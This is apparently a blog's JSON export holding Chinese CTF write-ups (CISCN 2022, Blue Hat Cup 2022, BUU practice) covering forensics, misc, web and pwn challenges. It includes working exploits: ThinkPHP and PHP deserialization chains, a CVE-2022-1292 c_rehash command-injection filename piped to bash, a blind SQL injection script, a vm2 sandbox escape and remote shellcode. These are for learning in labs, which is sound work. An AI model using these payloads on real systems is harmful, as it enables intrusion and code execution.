{"meta":{"title":"mrl64's Blog","subtitle":"","description":"summer again","author":"liszt_lin","url":"http://example.com","root":"/"},"pages":[{"title":"About me","date":"2021-09-18T01:53:01.000Z","updated":"2021-12-16T11:46:16.957Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"I’m mrl64Just a dumb noobHaving fun in ctf"},{"title":"categories","date":"2021-09-18T01:39:42.000Z","updated":"2021-09-18T01:41:02.269Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-09-18T01:39:20.000Z","updated":"2021-09-18T01:41:26.232Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"【CISCN2022】复盘write up","slug":"【CISCN2022】复盘write-up","date":"2022-07-12T06:58:39.000Z","updated":"2022-07-12T10:45:26.815Z","comments":true,"path":"2022/07/12/【CISCN2022】复盘write-up/","link":"","permalink":"http://example.com/2022/07/12/%E3%80%90CISCN2022%E3%80%91%E5%A4%8D%E7%9B%98write-up/","excerpt":"前言 比赛结束快一个月过去了，一直想做个ciscn的复盘，现在终于有时间整起来了，那就把初赛的web、misc做一个复盘吧，复盘平台NSSCTF。","text":"前言 比赛结束快一个月过去了，一直想做个ciscn的复盘，现在终于有时间整起来了，那就把初赛的web、misc做一个复盘吧，复盘平台NSSCTF。 miscez_usb是一个usb的流量包，看特征是键盘的usb，直接进行提取是一个rar的压缩包，但是我们发现压缩包的格式是错误的，观察hex发现存在多余字符。重新观察流量包，发现存在字符的版本有2.8.1和2.10.1两种，因此猜测需要分开导出。2.8.1，导出后是一个压缩包： 2.10.1，导出后是压缩包密码： 解压压缩包即可得到flag。 everlasting_night题目的附件只有一张图，给了提示这题存在LSB，且ARGB中存在LSB密码。那么使用stegslove查看颜色通道，最后在Alpha plane2中发现列隐藏数据。那么使用Data Extract进行提取： 找到了LSB的密码，使用cloacked-pixel解密，得到一个压缩包： 发现压缩包是加密的，再翻阅原图片的hex，发现最后有一串奇怪的字符串，经测试是MD5，使用somd5解密得到压缩包密码： 解压出来是一个data文件，直接导入进GIMP中，获得flag： babydisk附件里给了一个vmdk文件，直接扔进取证大师里，首先发现存在一个wav文件，导出后进行测试，发现存在deepsound加密，那么爆破密码： 得到密码feedback，使用deepsound解密得到key.txt： 1e575ac894c385a6f 接下来回到取证大师，发现存在被删除文件，同样将该文件导出，这里测试发现应该使用VeraCrypt工具进行加载，密码就是这个key。加载后我们得到了一个名为spiral的文件，hex是一个zip文件。但是里面的图片损坏了，根据文件名螺旋的含义，估计是要将hex进行螺旋操作。我们网上找一个脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748def function(n): matrix = [[0] * n for _ in range(n)] number = 1 left, right, up, down = 0, n - 1, 0, n - 1 while left &lt; right and up &lt; down: # 从左到右 for i in range(left, right): matrix[up][i] = number number += 1 # 从上到下 for i in range(up, down): matrix[i][right] = number number += 1 # 从右向左 for i in range(right, left, -1): matrix[down][i] = number number += 1 for i in range(down, up, -1): matrix[i][left] = number number += 1 left += 1 right -= 1 up += 1 down -= 1 # n 为奇数的时候，正方形中间会有个单独的空格需要单独填充 if n % 2 != 0: matrix[n // 2][n // 2] = number return matrix f = open(&#x27;spiral.zip&#x27;,&#x27;rb&#x27;).read()s = function(87)# print(s)s = sum(s,[])#print(s) f1 = open(&#x27;fla.zip&#x27;,&#x27;wb&#x27;)arr = [0]*7569# print(arr)for i in range(len(s)): arr[i] = f[s[i]-1]#print(arr)# print(arr)for i in arr: print(hex(i)[2:].zfill(2),end=&#x27;&#x27;) 得到一个新的压缩包，里面有一张图： 49个字符，7行7列，将第一行去掉后，进行从最右边开始上到下的螺旋操作，最后得到flag。 webezpopthinkphp的框架，控制器中存在反序列化，再一看原来是学长挖的洞：ThinkPHP6.0.12LTS反序列漏洞分析 那就比较简单了，有现成的poc： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php&lt;?phpnamespace think\\model\\concern;trait Attribute&#123; private $data = [&quot;key&quot; =&gt; [&quot;key1&quot; =&gt; &quot;cat /flag.txt&quot;]]; private $withAttr = [&quot;key&quot;=&gt;[&quot;key1&quot;=&gt;&quot;system&quot;]]; protected $json = [&quot;key&quot;];&#125;namespace think;abstract class Model&#123; use model\\concern\\Attribute; private $lazySave; protected $withEvent; private $exists; private $force; protected $table; protected $jsonAssoc; function __construct($obj = &#x27;&#x27;) &#123; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;table = $obj; $this-&gt;jsonAssoc = true; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b)); 最后在index.php/index/test中传入即可获取flag。 online_crt项目的组成是python+go，先看题目源码。首先是python： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192import datetimeimport jsonimport osimport socketimport uuidfrom cryptography import x509from cryptography.hazmat.backends import default_backendfrom cryptography.hazmat.primitives import hashes, serializationfrom cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.x509.oid import NameOIDfrom flask import Flaskfrom flask import render_templatefrom flask import requestapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(16)def get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress): root_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, backend=default_backend() ) subject = issuer = x509.Name([ x509.NameAttribute(NameOID.COUNTRY_NAME, Country), x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province), x509.NameAttribute(NameOID.LOCALITY_NAME, City), x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName), x509.NameAttribute(NameOID.COMMON_NAME, CommonName), x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress), ]) root_cert = x509.CertificateBuilder().subject_name( subject ).issuer_name( issuer ).public_key( root_key.public_key() ).serial_number( x509.random_serial_number() ).not_valid_before( datetime.datetime.utcnow() ).not_valid_after( datetime.datetime.utcnow() + datetime.timedelta(days=3650) ).sign(root_key, hashes.SHA256(), default_backend()) crt_name = &quot;static/crt/&quot; + str(uuid.uuid4()) + &quot;.crt&quot; with open(crt_name, &quot;wb&quot;) as f: f.write(root_cert.public_bytes(serialization.Encoding.PEM)) return crt_name@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index(): return render_template(&quot;index.html&quot;)@app.route(&#x27;/getcrt&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload(): Country = request.form.get(&quot;Country&quot;, &quot;CN&quot;) Province = request.form.get(&quot;Province&quot;, &quot;a&quot;) City = request.form.get(&quot;City&quot;, &quot;a&quot;) OrganizationalName = request.form.get(&quot;OrganizationalName&quot;, &quot;a&quot;) CommonName = request.form.get(&quot;CommonName&quot;, &quot;a&quot;) EmailAddress = request.form.get(&quot;EmailAddress&quot;, &quot;a&quot;) return get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)@app.route(&#x27;/createlink&#x27;, methods=[&#x27;GET&#x27;])def info(): json_data = &#123;&quot;info&quot;: os.popen(&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;).read()&#125; return json.dumps(json_data)@app.route(&#x27;/proxy&#x27;, methods=[&#x27;GET&#x27;])def proxy(): uri = request.form.get(&quot;uri&quot;, &quot;/&quot;) client = socket.socket() client.connect((&#x27;localhost&#x27;, 8887)) msg = f&#x27;&#x27;&#x27;GET &#123;uri&#125; HTTP/1.1Host: test_api_hostUser-Agent: GuestAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&#x27;&#x27;&#x27; client.send(msg.encode()) data = client.recv(2048) client.close() return data.decode()app.run(host=&quot;0.0.0.0&quot;, port=8888) 可以看到python这部分有4个路由： /：主界面 /getcrt：生成一个证书 /createlink：调用c_rehash创建证书链接 /proxy：访问go语言的内网环境 接着是go： 12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( &quot;github.com/gin-gonic/gin&quot; &quot;os&quot; &quot;strings&quot;)func admin(c *gin.Context) &#123; staticPath := &quot;/app/static/crt/&quot; oldname := c.DefaultQuery(&quot;oldname&quot;, &quot;&quot;) newname := c.DefaultQuery(&quot;newname&quot;, &quot;&quot;) if oldname == &quot;&quot; || newname == &quot;&quot; || strings.Contains(oldname, &quot;..&quot;) || strings.Contains(newname, &quot;..&quot;) &#123; c.String(500, &quot;error&quot;) return &#125; if c.Request.URL.RawPath != &quot;&quot; &amp;&amp; c.Request.Host == &quot;admin&quot; &#123; err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil &#123; return &#125; c.String(200, newname) return &#125; c.String(200, &quot;no&quot;)&#125;func index(c *gin.Context) &#123; c.String(200, &quot;hello world&quot;)&#125;func main() &#123; router := gin.Default() router.GET(&quot;/&quot;, index) router.GET(&quot;/admin/rename&quot;, admin) if err := router.Run(&quot;:8887&quot;); err != nil &#123; panic(err) &#125;&#125; 可以看到go语言里只有一个admin路由，功能是重命名证书。 这题设计的考点是CVE-2022-1292。我们首先访问/getcrt路由，生成一个证书，返回证书路径： 1static/crt/b9f56972-a301-4ed0-8d46-fbdf41fb064e.crt 接下来我们将这个证书的名称更改，使用老的证书把flag带到a.txt中去，payload： 1`echo &quot;Y2F0IC9mbGFnID4gYS50eHQ=&quot; | base64 -d | bash`.crt 构造发包： 123456789101112131415161718192021222324GET /proxy HTTP/1.1Host: 1.14.71.254:28507User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5FhbXcy21j5NxtoYContent-Length: 478------WebKitFormBoundary5FhbXcy21j5NxtoYContent-Disposition: form-data; name=&quot;uri&quot;/ HTTP/1.1Host: adminConnection: keep-aliveGET /admin%2frename?oldname=ffe891ef-d54b-4258-bdc7-9c89111daa4d.crt&amp;newname=%60%65%63%68%6f%20%22%59%32%46%30%49%43%39%6d%62%47%46%6e%49%44%34%67%59%53%35%30%65%48%51%3d%22%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%60%2e%63%72%74 HTTP/1.1Host: adminConnection: closeGET /------WebKitFormBoundary5FhbXcy21j5NxtoY-- 访问/creatlink，将flag带入，最后访问/static/crt/a.txt即可获取到flag。 ezpentest首先进来是一个登录框，题目也给出了waf： 12345678&lt;?phpfunction safe($a) &#123; $r = preg_replace(&#x27;/[\\s,()#;*~\\-]/&#x27;,&#x27;&#x27;,$a); $r = preg_replace(&#x27;/^.*(?=union|binary|regexp|rlike).*$/i&#x27;,&#x27;&#x27;,$r); return (string)$r; &#125;?&gt; 这里的payload和虎符杯的那题sql的payload类似： 10&#x27;||case&#x27;1&#x27;when`password`collate&#x27;utf8mb4_bin&#x27;like&#x27;&#123;&#125;%&#x27;then+9223372036854775807+1+&#x27;&#x27;else&#x27;0&#x27;end||&#x27; 利用like去正则匹配password这一列的数据，如果匹配到就返回9223372036854775807+1 这个表达式，而这个表示执行后会导致数据溢出，服务器会报500，否则就返回’0’，服务器会报error +’’是因为过滤了空白符号，所以用来连接起sql语句的，这里的数据溢出同样可以用18446744073709551615+1，这个18446744073709551615的值其实就是0，也就是说这个payload其实就是0+1 utf8mb4_bin是用来区分大小写的，因为like正则匹配是不区分大小写的 case用来解决优先级问题 exp: 123456789101112131415161718192021222324252627282930313233import requestsimport stringpayload=&quot;0&#x27;||case&#x27;1&#x27;when`username`collate&#x27;utf8mb4_bin&#x27;like&#x27;&#123;&#125;%&#x27;then+9223372036854775807+1+&#x27;&#x27;else&#x27;0&#x27;end||&#x27;&quot;#这里过滤了取反，所以要用9223372036854775807+1这个也可以18446744073709551615+1来代替溢出list = string.ascii_letters + string.digits + &#x27;^$!_%@&amp;&#x27;proxies=&#123; &#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; #这里是可以通过走代理来看下自己打进去的payload有没有啥问题。url = &#x27;http://1.14.71.254:28373/login.php&#x27;j=&#x27;&#x27;while 1: for i in list: if (i in &#x27;%_&#x27;): #这里是对like正则匹配中的一些特殊符号进行转义，这里很重要，不然注出来的结果都不行。 i = &quot;\\\\&quot; + i now_payload=payload.format(j+i) date=&#123; &#x27;password&#x27;: now_payload, &#x27;username&#x27;: &#x27;aaa&#x27; &#125; print(now_payload) re = requests.post(url,data=date) print(re.text) if re.status_code==500: print(&quot;ok&quot;) j+=i print(j) break# nssctfwabbybaboo!@$%!!# PAssw40d_Y0u3_Never_Konwn!@!! 登陆后发现一堆被混淆的php指令，根据页面上的提示访问1Nd3x_Y0u_N3v3R_Kn0W.php： 1b; $checker = new ReflectionClass(get_class($b)); if(basename($checker-&gt;getFileName()) != &#x27;SomeClass.php&#x27;)&#123; if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123; ($b-&gt;a)($b-&gt;b.&quot;&quot;); &#125; &#125; &#125; &#125; class B &#123; public $a; public $b; public function __toString() &#123; $this-&gt;a-&gt;see(); return &quot;1&quot;; &#125; &#125; class C &#123; public $a; public $b; public function __toString() &#123; $this-&gt;a-&gt;read(); return &quot;lock lock read!&quot;; &#125; &#125; class D &#123; public $a; public $b; public function read() &#123; $this-&gt;b-&gt;learn(); &#125; &#125; class E &#123; public $a; public $b; public function __invoke() &#123; $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;; &#125; public function __destruct()&#123; //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了 //echo &quot;???&quot;; die($this-&gt;a); &#125; &#125; class F &#123; public $a; public $b; public function __call($t1,$t2) &#123; $s1 = $this-&gt;b; $s1(); &#125; &#125; ?&gt; 访问SomeClass.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phpclass A&#123; public $a; public $b; public function see() &#123; $b = $this-&gt;b; $checker = new ReflectionClass(get_class($b)); if(basename($checker-&gt;getFileName()) != &#x27;SomeClass.php&#x27;)&#123; if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123; ($b-&gt;a)($b-&gt;b.&quot;&quot;); &#125; &#125; &#125;&#125;class B&#123; public $a; public $b; public function __toString() &#123; $this-&gt;a-&gt;see(); return &quot;1&quot;; &#125;&#125;class C&#123; public $a; public $b; public function __toString() &#123; $this-&gt;a-&gt;read(); return &quot;lock lock read!&quot;; &#125;&#125;class D&#123; public $a; public $b; public function read() &#123; $this-&gt;b-&gt;learn(); &#125;&#125;class E&#123; public $a; public $b; public function __invoke() &#123; $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;; &#125; public function __destruct()&#123; //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了 //echo &quot;???&quot;; die($this-&gt;a); &#125;&#125;class F&#123; public $a; public $b; public function __call($t1,$t2) &#123; $s1 = $this-&gt;b; $s1(); &#125;&#125;?&gt; 解密花指令https://github.com/wenshui2008/phpjiami_decode 123456789101112131415161718192021222324252627&lt;?phpsession_start();if(!isset($_SESSION[&#x27;login&#x27;]))&#123; die();&#125;function Al($classname)&#123; include $classname.&quot;.php&quot;;&#125;if(isset($_REQUEST[&#x27;a&#x27;]))&#123; $c = $_REQUEST[&#x27;a&#x27;]; $o = unserialize($c); if($o === false) &#123; die(&quot;Error Format&quot;); &#125;else&#123; spl_autoload_register(&#x27;Al&#x27;); $o = unserialize($c); $raw = serialize($o); if(preg_match(&quot;/Some/i&quot;,$raw))&#123; throw new Error(&quot;Error&quot;); &#125; $o = unserialize($raw); var_dump($o); &#125;&#125;else &#123; echo file_get_contents(&quot;SomeClass.php&quot;);&#125; 那这里就是利用pop反序列化了，入口点在class E，die方法中是字符串处理，让a为对象会触发__toString方法，在类A中，我们只需要令b为原生类，a参数和b参数都是可控的就可以rce了。链子的触发点就是1Nd3x_Y0u_N3v3R_Kn0W.php文件，但是如果我们想把可以rce的文件包含进来，就要创建一个SomeClass类，而这里对some进行了过滤。我们只需要让include $classname.”.php”将文件包含的同时直接进入那个destrust方法销毁，这里可以利用gc回收机制。我们将数组索引置为0，这样就会失去上一个对象的引用从而进入destrust。 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;?phpclass A&#123; public $a; public $b; public function see() &#123; $b = $this-&gt;b; $checker = new ReflectionClass(get_class($b)); if(basename($checker-&gt;getFileName()) != &#x27;SomeClass.php&#x27;)&#123; if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123; ($b-&gt;a)($b-&gt;b.&quot;&quot;); &#125; &#125; &#125;&#125;class B&#123; public $a; public $b; public function __toString() &#123; $this-&gt;a-&gt;see(); return &quot;1&quot;; &#125;&#125;class C&#123; public $a; public $b; public function __toString() &#123; $this-&gt;a-&gt;read(); return &quot;lock lock read!&quot;; &#125;&#125;class D&#123; public $a; public $b; public function read() &#123; $this-&gt;b-&gt;learn(); &#125;&#125;class E&#123; public $a; public $b; public function __invoke() &#123; $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;; &#125; public function __destruct()&#123; die($this-&gt;a); &#125;&#125;class F&#123; public $a; public $b; public function __call($t1,$t2) &#123; $s1 = $this-&gt;b; $s1(); &#125;&#125;class SomeClass&#123; public $a;&#125;$e = new E();$a = new A();$b = new B();$e-&gt;a = $b;$b-&gt;a = $a;$arr = new ArrayObject();$arr-&gt;a = &quot;system&quot;;$arr-&gt;b = &quot;cat /nssctfflag&quot;;$a-&gt;b = $arr;$c = new SomeClass();$c-&gt;a = $e;echo urlencode(str_replace(&quot;i:1;&quot;, &quot;i:0;&quot;, serialize(array($c,1))));//a%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SomeClass%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22E%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BC%3A11%3A%22ArrayObject%22%3A73%3A%7Bx%3Ai%3A0%3Ba%3A0%3A%7B%7D%3Bm%3Aa%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22system%22%3Bs%3A1%3A%22b%22%3Bs%3A15%3A%22cat+%2Fnssctfflag%22%3B%7D%7D%7Ds%3A1%3A%22b%22%3BN%3B%7Ds%3A1%3A%22b%22%3BN%3B%7D%7Di%3A0%3Bi%3A0%3B%7D 传参即可得到flag。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"【蓝帽杯2022初赛】团队write up","slug":"【蓝帽杯2022初赛】团队write-up","date":"2022-07-09T14:08:40.000Z","updated":"2022-07-09T14:24:56.992Z","comments":true,"path":"2022/07/09/【蓝帽杯2022初赛】团队write-up/","link":"","permalink":"http://example.com/2022/07/09/%E3%80%90%E8%93%9D%E5%B8%BD%E6%9D%AF2022%E5%88%9D%E8%B5%9B%E3%80%91%E5%9B%A2%E9%98%9Fwrite-up/","excerpt":"前言 和取证斗智斗勇了一天，做的头疼，懒得再单独搞wp了，直接放团队的了。","text":"前言 和取证斗智斗勇了一天，做的头疼，懒得再单独搞wp了，直接放团队的了。 电子取证手机取证_1打开exe后直接搜索627604C2-C586-48C1-AA16-FF33C3022159.PNG，找到图片文件并导出，获取图片分辨率 flag值：360x360 手机取证_2搜索 姜总 查看微信群组中的聊天记录即可找到快递单号 flag值：SF1142358694796 计算机取证_1直接kit工具一把梭，得到密码 flag值：anxinqi 计算机取证_2使用命令volatility -f 1.dmp --profile=Win7SP1x64 cmdline查看1.dmp的cmdline，发现MagnetRAMCaptu文件以及PID值 flag值：2192 程序分析_1使用aapt反编译AndroidManifest.xml文件，找到程序包名 1Cmd：aapt.exe dump xmltree EXEC.apk AndroidManifest.xml flag值：exec.azj.kny.d.c 程序分析_2同样使用aapt查看程序状态，找到入口 1Cmd：aapt.exe dump badging EXEC.apk flag值：minmtta.hemjcbm.ahibyws.MainActivity 程序分析_3Jeb反编译文件，找到入口的MainActivity，发现加密字符串，即为本程序的服务器地址的密文： flag值：aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6 程序分析_4用jeb打开，逐个查看源码，找到一处疑似检测环境的，类名为a flag值：a 网站取证_1木马肯定都是在敏感文件夹中，直接找upload之类的文件夹，发现里面没有东西，那就去找temp文件夹，最后在\\www\\runtime\\temp\\0f71e181346d43e56722aec663e5d4e9.php找到木马的密码 flag值：lanmaobei666 网站取证_2找数据库密码首先找database.php文件，这个文件在\\www\\application\\database.php接下来打开后发现这样几行代码： 12include (&quot;encrypt/encrypt.php&quot;);&#x27;password&#x27; =&gt; my_encrypt() 那么我们跟进到encrypto.php中，发现加密函数： 123456789101112131415&lt;?phpfunction my_encrypt()&#123; $str = &#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;; $str = str_replace(array(&quot;/r/n&quot;, &quot;/r&quot;, &quot;/n&quot;), &quot;&quot;, $str); $key = &#x27;PanGuShi&#x27;; $iv = substr(sha1($key),0,16); $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&quot;&quot;,MCRYPT_MODE_CBC,&quot;&quot;); mcrypt_generic_init($td, &quot;PanGuShi&quot;, $iv); $decode = base64_decode($str); $dencrypted = mdecrypt_generic($td, $decode); mcrypt_generic_deinit($td); mcrypt_module_close($td); $dencrypted = trim($dencrypted); return $dencrypted;&#125; 阅读发现是AES加密，str和key都给了，iv是key的sha1的前16位，那么我们在线解密，得到数据库密码: flag值：KBLT123 网站取证_3看了眼bak.sql文件发现转账记录存在tab_channel_order_list中，我就按这个名字去搜文件，然后就找到了这个文件\\www\\application\\admin\\model\\Channelorderlist.phpSalt文件的就在函数中 flag值：jyzg123456 网站取证_4既然直接给了解密函数就可以直接得到GG币的金额，转账金额×当天汇率的总和就是总金额了。要注意转账人和收款人的id，是id为3的向id为5的转账。这些数据在bak.sql都可以找到并对应上。由于我太菜了，不会写脚本一次到位，因此直接手算了，下面是解密单个加密值的脚本 12345678910111213141516171819202122232425&lt;?php$key = &#x27;jyzg123456&#x27;;$data = &#x27;mplslWps&#x27;;$key = md5($key);$x = 0;$data = base64_decode($data);$len = mb_strlen($data);$l = mb_strlen($key);$char = &#x27;&#x27;;$str = &#x27;&#x27;;for ($i = 0; $i &lt; $len; $i++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= mb_substr($key, $x, 1); $x++;&#125;for ($i = 0; $i &lt; $len; $i++) &#123; if (ord(mb_substr($data, $i, 1)) &lt; ord(mb_substr($char, $i, 1))) &#123; $str .= chr((ord(mb_substr($data, $i, 1)) + 256) - ord(mb_substr($char, $i, 1))); &#125; else &#123; $str .= chr(ord(mb_substr($data, $i, 1)) - ord(mb_substr($char, $i, 1))); &#125;&#125;echo $str; flag值：15758353.76 MISCdomainhacker分析流量操作大概是：把数据打包成rar，移动rar，get的经典域渗透操作，解密base64找到密码：SecretsPassw0rds 提取压缩包，打开后发现是mimikazt，直接找到hash值提交即可 flag值：flag{416f89c3a5deb1d398a1a1fce93862a7} domainhacker2分析流量操作大概依旧是：把需要的数据打包成rar，移动rar，get的经典域渗透操作，解密base64找到密码FakePassword123$ 发现ntds.dit文件，使用指令提取ntds历史记录： 1impacket-secretsdump -system /home/kali/桌面/1122/SYSTEM -security /home/kali/桌面/1122/SECURITY -ntds /home/kali/桌面/1122/ntds.dit LOCAL -history flag值：flag{07ab403ab740c1540c378b0f5aaa4087} PWNEscapeShellcode首先程序开启了沙箱，禁用了除了read和write以外的功能： pre_shellcode的功能是将一堆寄存器置0xdeadbeefdeadbeef： 但是肯定不会将rip破坏。因此rip的值就是切入点。由于是在堆上执行，所以rip指向的内容就是堆中的地址，根据这个地址可以计算出堆的基地址。然后测试时用sys_write打印堆中的所有内容，发现存在有libseccomp.so映射入内存中的地址，利用这个地址可以计算出与libc的偏移，从而可以控制rsi指向libc的基地址。由于不同版本的偏移量不一样，经过测试，最终确定靶机使用的是U18.04，libc-2.27。发现environ中有_start的地址： 通过计算可以控制rsi指向environ，再指向_start。这样再通过计算偏移量就可以使得rsi指向flag的地址，最终利用sys_write就可以打印出flag了： exp: 1234567891011121314151617181920212223242526272829303132333435from pwn import *context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#io=process(&#x27;./escape_shellcode&#x27;)io=remote(&#x27;39.106.154.121&#x27;,27654)shellcode=&#x27;&#x27;&#x27;endbr64lea rsi, [rip]mov rsp, rsiadd rsp, 0x1000mov rdi, 1and si, 0xf000add rsi, 0x12d0mov rsi, [rsi]sub rsi, 0x60fca0add rsi, 0x3ee098mov rsi, [rsi]sub rsi, 0xb8mov rsi, [rsi]sub rsi, 0x11a0add rsi, 0x4120mov rdx, 0x200mov rax, 1syscall&#x27;&#x27;&#x27;shellcode=asm(shellcode)#print(len(shellcode))#gdb.attach(io)io.send(shellcode)io.interactive() flag值：flag{c08bbe2a-3378-4789-b146-d29947b1424b}","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"buu练习10","slug":"buu练习10","date":"2022-07-08T06:18:18.000Z","updated":"2022-07-08T09:39:03.225Z","comments":true,"path":"2022/07/08/buu练习10/","link":"","permalink":"http://example.com/2022/07/08/buu%E7%BB%83%E4%B9%A010/","excerpt":"前言 继续刷，准备蓝帽，好久没做题了都。","text":"前言 继续刷，准备蓝帽，好久没做题了都。 [HFCTF2020]JustEscape进入题目，发现首页提示run.php并且给了一些实例，我们访问这个php文件得到一个代码： 12345678&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123; $code = $_GET[&#x27;code&#x27;]; echo eval(code);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 看起来是一个命令执行，还没过滤的，但是这肯定没那么简单，随便传点东西上去试试，比如code=phpinfo();，查看返回： 1ReferenceError: phpinfo is not defined 什么鬼没有定义，结合首页提示我们这真的是php吗，我们可以想到除了php以外，js中也是有eval()这个函数的，那么我们来测试一波： 1?code=Error().stack 看到返回结果，果不其然： 1Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) 那结合题目很明显这题是一个vm2逃逸，直接套poc： 12345678910111213141516&quot;use strict&quot;;const &#123;VM&#125; = require(&#x27;vm2&#x27;);const untrusted = &#x27;(&#x27; + function()&#123; TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`].get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125;&#125;+&#x27;)()&#x27;;try&#123; console.log(new VM().run(untrusted));&#125;catch(x)&#123; console.log(x);&#125; 测试后发现存在过滤用javascript的模版文字绕过。最后poc： 12345678(function ()&#123; TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)(); try&#123; Object.preventExtensions(Buffer.from(``)).a = 1; &#125;catch(e)&#123; return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString(); &#125;&#125;)() 得到flag。 [HFCTF2020]BabyUpload进来就是代码审计： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 &lt;?phperror_reporting(0);session_save_path(&quot;/var/babyctf/&quot;);session_start();require_once &quot;/flag&quot;;highlight_file(__FILE__);if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)&#123; $filename=&#x27;/var/babyctf/success.txt&#x27;; if(file_exists($filename))&#123; safe_delete($filename); die($flag); &#125;&#125;else&#123; $_SESSION[&#x27;username&#x27;] =&#x27;guest&#x27;;&#125;$direction = filter_input(INPUT_POST, &#x27;direction&#x27;);$attr = filter_input(INPUT_POST, &#x27;attr&#x27;);$dir_path = &quot;/var/babyctf/&quot;.$attr;if($attr===&quot;private&quot;)&#123; $dir_path .= &quot;/&quot;.$_SESSION[&#x27;username&#x27;];&#125;if($direction === &quot;upload&quot;)&#123; try&#123; if(!is_uploaded_file($_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]))&#123; throw new 